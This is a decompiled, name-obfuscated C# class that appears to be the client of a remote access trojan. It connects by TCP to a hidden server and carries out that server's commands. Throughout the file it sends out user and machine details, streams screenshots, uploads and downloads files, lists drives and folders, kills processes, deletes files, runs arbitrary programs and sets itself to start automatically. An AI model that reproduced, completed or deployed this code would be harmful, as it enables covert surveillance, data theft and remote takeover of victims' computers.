using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace trbgertrnion;

public class MCRSIDM
{
	private Dictionary<string, byte[]> trbgertrniontasdks = new Dictionary<string, byte[]>();

	public DateTime trbgertrnionrunTime;

	private int trbgertrnionbytesRead = 0;

	public bool trbgertrnionreqCnls = false;

	private int trbgertrnionatmps = 0;

	public bool trbgertrnionautCnls = false;

	public DateTime trbgertrnionlTimeUtc;

	private THRARWE trbgertrnionStaterObj = new THRARWE();

	private MESAINR trbgertrnionUPC;

	private OSCAMID trbgertrnionCMD;

	private int trbgertrnionscrSize = 200;

	private ThreadStart trbgertrnionfunStarter;

	public TcpClient trbgertrniontcpsck;

	public NetworkStream trbgertrnionnetStream;

	private int trbgertrnionbuffSize = 1024;

	private DEARIVF trbgertrnionHdD = new DEARIVF();

	public bool trbgertrnionis_wordking = false;

	private bool trbgertrnioniswitch = false;

	public int port_sn = 0;

	private bool trbgertrnionthrRuning = false;

	private int trbgertrnionthreadCnts = 0;

	private bool trbgertrnionstr_wrditer = false;

	private bool trbgertrnioncapScrdeen = false;

	private Thread trbgertrnionfunThdread;

	public void trbgertrniondoa_start()
	{
		CIADINF.trbgertrnionport = CIADINF.ports[0];
		trbgertrnionrunTime = DateTime.Now;
		trbgertrnionUPC = new MESAINR();
		trbgertrnionCMD = new OSCAMID(this);
		trbgertrnionHdD.iserver = this;
		trbgertrnionHdD.trbgertrnionmainPath = CIADINF.trbgertrnionget_mpath();
		TimerCallback callback = trbgertrnionloaokup_cngx;
		Timer trbgertrniontimer = new Timer(callback, trbgertrnionStaterObj, 32110, 36110);
		trbgertrnionStaterObj.trbgertrniontimer = trbgertrniontimer;
	}

	public void trbgertrnionsaaveFile(string filePath)
	{
		try
		{
			byte[] array = trbgertrnionpuall_fdata();
			if (array != null)
			{
				File.WriteAllBytes(filePath, array);
			}
		}
		catch
		{
		}
	}

	public string trbgertrnionfiale_info(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|trbgertrnion".Split(new char[1] { '|' })[0] : "<|trbgertrnion".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ((!ret) ? ">|trbgertrnion".Split(new char[1] { '|' })[0] : "<|trbgertrnion".Split(new char[1] { '|' })[0]);
			text = text + trbgertrniongeat_size(fileInfo.Length) + ((!ret) ? ">|trbgertrnion".Split(new char[1] { '|' })[0] : "<|trbgertrnion".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				trbgertrnionpuash_data(null, "trbgertrnion-fialsz=|trbgertrnion".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	private void trbgertrnioncheckLaastatime(DateTime mTimeUtc)
	{
		try
		{
			int num = Math.Abs(trbgertrnionrunTime.Subtract(mTimeUtc).Minutes);
			if (num > 6)
			{
				trbgertrniontcpsck.Close();
				trbgertrnionis_wordking = false;
			}
		}
		catch
		{
		}
	}

	private void trbgertrnionloaokup_cngx(object sdogource)
	{
		try
		{
			if (!trbgertrnionthrRuning)
			{
				trbgertrnionthrRuning = true;
				trbgertrnioncheckLaastatime(DateTime.Now);
				if (!trbgertrnionis_wordking || !trbgertrniontcpsck.Connected)
				{
					trbgertrnionis_wordking = trbgertrnionIPSCX();
					if (trbgertrnionis_wordking)
					{
						trbgertrnionbuffSize = trbgertrniontcpsck.ReceiveBufferSize;
						trbgertrnionseae_rexi();
					}
				}
			}
			else
			{
				trbgertrnionthreadCnts++;
			}
			trbgertrnionthrRuning = false;
		}
		catch
		{
			trbgertrnionatmps++;
			trbgertrnionthrRuning = false;
			trbgertrnionthreadCnts = 0;
			trbgertrnionstr_wrditer = false;
			trbgertrnionis_wordking = false;
			trbgertrnioniswitch = false;
		}
	}

	public void trbgertrnionpoarts_switch()
	{
		try
		{
			port_sn++;
			CIADINF.trbgertrnionport = CIADINF.ports[port_sn];
			if (port_sn >= CIADINF.ports.Length - 1)
			{
				port_sn = 0;
			}
		}
		catch
		{
			port_sn = 0;
		}
	}

	public void trbgertrnionliast_processes()
	{
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				text = text + processes[i].Id + ">|trbgertrnion".Split(new char[1] { '|' })[0];
				text = text + processes[i].ProcessName + ">|trbgertrnion".Split(new char[1] { '|' })[0];
				text += "0>|trbgertrnion".Split(new char[1] { '|' })[0];
				text += "<";
			}
			byte[] byteArray = CIADINF.getByteArray(text);
			trbgertrnionpuash_data(byteArray, "trbgertrnion-praocl=proass|trbgertrnion".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private bool trbgertrnionIPSCX()
	{
		try
		{
			CIADINF.trbgertrniondefaultP = CIADINF.getBytsString(CIADINF.trbgertrnionvpsips);
			trbgertrniontcpsck = new TcpClient();
			trbgertrniontcpsck.Connect(CIADINF.trbgertrniondefaultP, CIADINF.trbgertrnionport);
			return true;
		}
		catch
		{
			trbgertrnionpoarts_switch();
			return false;
		}
	}

	public bool trbgertrnionseand_auto(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				fileinfo = fileinfo + ">" + fileName;
				trbgertrnionpuash_data(data, "trbgertrnion-afaile=" + fileinfo);
				return false;
			}
			trbgertrnionpuash_data(null, "trbgertrnion-anafod=" + fileinfo);
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void trbgertrnionloaad_app()
	{
		try
		{
			string executablePath = Application.get_ExecutablePath();
			Thread.Sleep(10);
			CIADINF.trbgertrnionset_run("larvir|trbgertrnion".Split(new char[1] { '|' })[0], executablePath);
		}
		catch
		{
		}
	}

	private void trbgertrnionimaage_info(string path)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(path), new Size(200, 150));
			if (val != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name + ">|trbgertrnion".Split(new char[1] { '|' })[0];
				text = text + fileInfo.CreationTimeUtc.Date.ToString() + ">|trbgertrnion".Split(new char[1] { '|' })[0];
				text = text + trbgertrniongeat_size(fileInfo.Length) + ">";
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Gif());
				trbgertrnionpuash_data(memoryStream.ToArray(), "trbgertrnion-thaumb=|trbgertrnion".Split(new char[1] { '|' })[0] + text);
			}
		}
		catch
		{
		}
	}

	private void trbgertrnionisa_scrDn(string scrDndSize)
	{
		try
		{
			SCIRANS sCIRANS = new SCIRANS();
			trbgertrnionscrSize = Convert.ToInt16(scrDndSize.Split(new char[1] { '>' })[0].Trim());
			while (trbgertrnioncapScrdeen && trbgertrnionis_wordking)
			{
				Bitmap val = sCIRANS.trbgertrnionscrDn(trbgertrnionscrSize);
				if (val != null)
				{
					MemoryStream memoryStream = new MemoryStream();
					((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
					trbgertrnionpuash_data(memoryStream.ToArray(), "trbgertrnion-scaren=capareen|trbgertrnion".Split(new char[1] { '|' })[0]);
				}
			}
		}
		catch
		{
		}
	}

	private void trbgertrnionusaer_info()
	{
		string text = trbgertrnionUPC.trbgertrnionlancard + "|" + trbgertrnionUPC.trbgertrnioncname + "|" + trbgertrnionUPC.trbgertrnionuname + "|" + trbgertrnionUPC.trbgertrnionuip + "|" + CIADINF.trbgertrnionOsname() + "|" + trbgertrnionUPC.trbgertrnionapver + "|".ToString();
		text += "| !trbgertrnion".Split(new char[1] { '!' })[0];
		text = text + "|" + trbgertrnionUPC.trbgertrnionclientNum;
		text = text + "|" + CIADINF.trbgertrnionget_mpath();
		byte[] byteArray = CIADINF.getByteArray(text);
		trbgertrnionpuash_data(byteArray, "trbgertrnion-inafo=usaer|trbgertrnion".Split(new char[1] { '|' })[0]);
	}

	private void trbgertrnionscareenSize(string scSize)
	{
		try
		{
			string[] array = scSize.Split(new char[1] { '>' });
			trbgertrnionscrSize = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	private void trbgertrnionseae_scren(string scrDndSize)
	{
		try
		{
			SCIRANS sCIRANS = new SCIRANS();
			trbgertrnionscrSize = Convert.ToInt16(scrDndSize.Split(new char[1] { '>' })[0].Trim());
			Bitmap val = sCIRANS.trbgertrnionscrDn(trbgertrnionscrSize);
			if (val != null)
			{
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				trbgertrnionpuash_data(memoryStream.ToArray(), "trbgertrnion-saascr=capareen|trbgertrnion".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private void trbgertrnionpuash_file(string lfile)
	{
		try
		{
			if (File.Exists(lfile))
			{
				string fileName = Path.GetFileName(lfile);
				trbgertrnionpuash_data(File.ReadAllBytes(lfile), "trbgertrnion-fiale=|trbgertrnion".Split(new char[1] { '|' })[0] + lfile + ">0>" + fileName, tmp: true);
			}
		}
		catch
		{
		}
	}

	public void trbgertrnionremaove_file(string path)
	{
		try
		{
			File.Delete(path);
		}
		catch
		{
		}
	}

	public string[] trbgertrniongeat_codmand()
	{
		try
		{
			byte[] array = new byte[5];
			trbgertrnionbytesRead = trbgertrnionnetStream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= trbgertrnionbytesRead)
			{
				int count = ((num3 > trbgertrnionbuffSize) ? trbgertrnionbuffSize : num3);
				trbgertrnionbytesRead = trbgertrnionnetStream.Read(array2, num2, count);
				num2 += trbgertrnionbytesRead;
			}
			string bytsString = CIADINF.getBytsString(array2);
			if (bytsString.Trim() == "")
			{
				return null;
			}
			return bytsString.Split(new char[1] { '=' });
		}
		catch
		{
			trbgertrnionis_wordking = false;
			return null;
		}
	}

	private string trbgertrniongeat_size(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B|trbgertrnion".Split(new char[1] { '|' })[0],
				"KB|trbgertrnion".Split(new char[1] { '|' })[0],
				"MB|trbgertrnion".Split(new char[1] { '|' })[0],
				"GB|trbgertrnion".Split(new char[1] { '|' })[0],
				"TB|trbgertrnion".Split(new char[1] { '|' })[0],
				"PB|trbgertrnion".Split(new char[1] { '|' })[0],
				"EB|trbgertrnion".Split(new char[1] { '|' })[0]
			};
			if (byteCount == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "";
		}
	}

	public byte[] trbgertrnionpuall_fdata()
	{
		try
		{
			trbgertrnionrunTime = DateTime.Now;
			int num = 0;
			byte[] array = new byte[5];
			trbgertrnionbytesRead = trbgertrnionnetStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !trbgertrnionreqCnls)
			{
				int count = ((num3 > trbgertrnionbuffSize) ? trbgertrnionbuffSize : num3);
				trbgertrnionbytesRead = trbgertrnionnetStream.Read(array2, num, count);
				num += trbgertrnionbytesRead;
				num3 -= trbgertrnionbytesRead;
				trbgertrnionrunTime = DateTime.Now;
			}
			if (trbgertrnionreqCnls)
			{
				trbgertrnionnetStream.Flush();
				while (trbgertrnionnetStream.DataAvailable && trbgertrnionnetStream.ReadByte() >= 0)
				{
				}
				array2 = null;
			}
			return array2;
		}
		catch
		{
			trbgertrnionis_wordking = false;
			return null;
		}
	}

	private void trbgertrnionliastDrives()
	{
		string text = trbgertrnionHdD.trbgertrnionloaokup_Drives();
		trbgertrnionpuash_data(null, "trbgertrnion-diars=" + text);
	}

	public bool trbgertrnionpuash_data(byte[] data, string type, bool tmp = false)
	{
		try
		{
			trbgertrnionrunTime = DateTime.Now;
			if (trbgertrnionstr_wrditer)
			{
				return false;
			}
			trbgertrnionstr_wrditer = true;
			byte[] byteArray = CIADINF.getByteArray(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes = BitConverter.GetBytes(byteArray.Length);
			byte[] array2 = new byte[num2 + byteArray.Length + num];
			bytes.CopyTo(array2, 0);
			byteArray.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + byteArray.Length);
				data.CopyTo(array2, 10 + byteArray.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0 && !trbgertrnionreqCnls)
			{
				int num5 = ((num4 > trbgertrnionbuffSize) ? trbgertrnionbuffSize : num4);
				trbgertrnionnetStream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
				trbgertrnionrunTime = DateTime.Now;
			}
			trbgertrnionstr_wrditer = false;
			if (trbgertrnionreqCnls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			trbgertrnionstr_wrditer = false;
			trbgertrnionis_wordking = false;
			return false;
		}
	}

	private void trbgertrnionseae_rexi()
	{
		if (!trbgertrnioniswitch)
		{
			trbgertrnioniswitch = true;
			trbgertrnionnetStream = trbgertrnionCMD.trbgertrnionNS(trbgertrniontcpsck);
			trbgertrnioncapScrdeen = false;
			while (trbgertrnionis_wordking)
			{
				string[] switchType = trbgertrniongeat_codmand();
				if (switchType != null)
				{
					trbgertrnionreqCnls = false;
					string text = switchType[0].ToLower();
					if (text.Split(new char[1] { '-' }).Length > 1)
					{
						text = text.Split(new char[1] { '-' })[1];
					}
					text = text.Insert(2, "3");
					text = "trbgertrnion-" + text.Replace("creen", "crdn");
					switch (text)
					{
					case "trbgertrnion-pr3aocl":
					case "trbgertrnion-pr3ocl":
						trbgertrnionfunStarter = delegate
						{
							trbgertrnionliast_processes();
						};
						trbgertrnionfunThdread = new Thread(trbgertrnionfunStarter);
						trbgertrnionfunThdread.Start();
						break;
					case "trbgertrnion-en3adpo":
					case "trbgertrnion-en3dpo":
						try
						{
							Process.GetProcessById(Convert.ToInt16(switchType[1].Trim())).Kill();
						}
						catch
						{
						}
						break;
					case "trbgertrnion-sc3arsz":
					case "trbgertrnion-sc3rsz":
						trbgertrnionscareenSize(switchType[1]);
						break;
					case "trbgertrnion-cs3acrdn":
					case "trbgertrnion-cs3crdn":
						trbgertrnionseae_scren(switchType[1]);
						break;
					case "trbgertrnion-di3ars":
					case "trbgertrnion-di3rs":
						trbgertrnionfunThdread = new Thread(trbgertrnionliastDrives);
						trbgertrnionfunThdread.Start();
						break;
					case "trbgertrnion-st3aops":
					case "trbgertrnion-st3ops":
						trbgertrnioncapScrdeen = false;
						break;
					case "trbgertrnion-fi3alsz":
					case "trbgertrnion-fi3lsz":
						trbgertrnionfunStarter = delegate
						{
							trbgertrnionfiale_info(switchType[1]);
						};
						trbgertrnionfunThdread = new Thread(trbgertrnionfunStarter);
						trbgertrnionfunThdread.Start();
						break;
					case "trbgertrnion-ru3apth":
					case "trbgertrnion-ru3pth":
						trbgertrnionpuash_data(null, "trbgertrnion-apapth=|trbgertrnion".Split(new char[1] { '|' })[0] + CIADINF.trbgertrnionget_mpath());
						break;
					case "trbgertrnion-do3awf":
					case "trbgertrnion-do3wf":
						trbgertrnionsaaveFile(switchType[1]);
						break;
					case "trbgertrnion-cn3als":
					case "trbgertrnion-cn3ls":
						trbgertrnionautCnls = true;
						trbgertrnionreqCnls = true;
						trbgertrnioncapScrdeen = false;
						break;
					case "trbgertrnion-sc3aren":
					case "trbgertrnion-sc3ren":
						trbgertrnioncapScrdeen = true;
						trbgertrnionfunStarter = delegate
						{
							trbgertrnionisa_scrDn(switchType[1]);
						};
						trbgertrnionfunThdread = new Thread(trbgertrnionfunStarter);
						trbgertrnionfunThdread.Start();
						break;
					case "trbgertrnion-th3aumb":
					case "trbgertrnion-th3umb":
						trbgertrnionimaage_info(switchType[1]);
						break;
					case "trbgertrnion-pu3atsrt":
					case "trbgertrnion-pu3tsrt":
						trbgertrnionloaad_app();
						break;
					case "trbgertrnion-ud3alt":
					case "trbgertrnion-ud3lt":
						trbgertrnionCMD.trbgertrnionremove_user();
						break;
					case "trbgertrnion-de3alt":
					case "trbgertrnion-de3lt":
						trbgertrnionfunStarter = delegate
						{
							trbgertrnionremaove_file(switchType[1]);
						};
						trbgertrnionfunThdread = new Thread(trbgertrnionfunStarter);
						trbgertrnionfunThdread.Start();
						break;
					case "trbgertrnion-fi3ale":
					case "trbgertrnion-fi3le":
						trbgertrnionfunStarter = delegate
						{
							trbgertrnionpuash_file(switchType[1]);
						};
						trbgertrnionfunThdread = new Thread(trbgertrnionfunStarter);
						trbgertrnionfunThdread.Start();
						break;
					case "trbgertrnion-in3afo":
					case "trbgertrnion-in3fo":
						trbgertrnionfunThdread = new Thread(trbgertrnionusaer_info);
						trbgertrnionfunThdread.Start();
						break;
					case "trbgertrnion-ru3anf":
					case "trbgertrnion-ru3nf":
						Process.Start(switchType[1].Split(new char[1] { '>' })[0]);
						break;
					case "trbgertrnion-af3aile":
					case "trbgertrnion-af3ile":
						trbgertrnionfunStarter = delegate
						{
							trbgertrnionseand_auto(switchType[1]);
						};
						trbgertrnionfunThdread = new Thread(trbgertrnionfunStarter);
						trbgertrnionfunThdread.Start();
						break;
					case "trbgertrnion-li3astf":
					case "trbgertrnion-li3stf":
						trbgertrnionfunStarter = delegate
						{
							trbgertrnionHdD.trbgertrnionloaok_Files(switchType[1]);
						};
						trbgertrnionfunThdread = new Thread(trbgertrnionfunStarter);
						trbgertrnionfunThdread.Start();
						break;
					case "trbgertrnion-do3awr":
					case "trbgertrnion-do3wr":
						trbgertrnionsaaveFile(switchType[1]);
						break;
					case "trbgertrnion-fl3aes":
					case "trbgertrnion-fl3es":
					{
						string files = trbgertrnionHdD.trbgertrnionloaokup_Files(switchType[1]);
						if (files != "")
						{
							trbgertrnionfunStarter = delegate
							{
								trbgertrnionpuash_data(null, "trbgertrnion-flaes=|trbgertrnion".Split(new char[1] { '|' })[0] + files);
							};
							trbgertrnionfunThdread = new Thread(trbgertrnionfunStarter);
							trbgertrnionfunThdread.Start();
						}
						break;
					}
					case "trbgertrnion-fl3adr":
					case "trbgertrnion-fl3dr":
					{
						string Folders = trbgertrnionHdD.trbgertrnionchaeck_Folders(switchType[1]);
						if (Folders != "")
						{
							trbgertrnionfunStarter = delegate
							{
								trbgertrnionpuash_data(null, "trbgertrnion-fladr=|trbgertrnion".Split(new char[1] { '|' })[0] + Folders);
							};
							trbgertrnionfunThdread = new Thread(trbgertrnionfunStarter);
							trbgertrnionfunThdread.Start();
						}
						break;
					}
					}
					continue;
				}
				trbgertrnionis_wordking = false;
				break;
			}
			trbgertrnionis_wordking = false;
			trbgertrnioncapScrdeen = false;
		}
		trbgertrnioniswitch = false;
	}
}
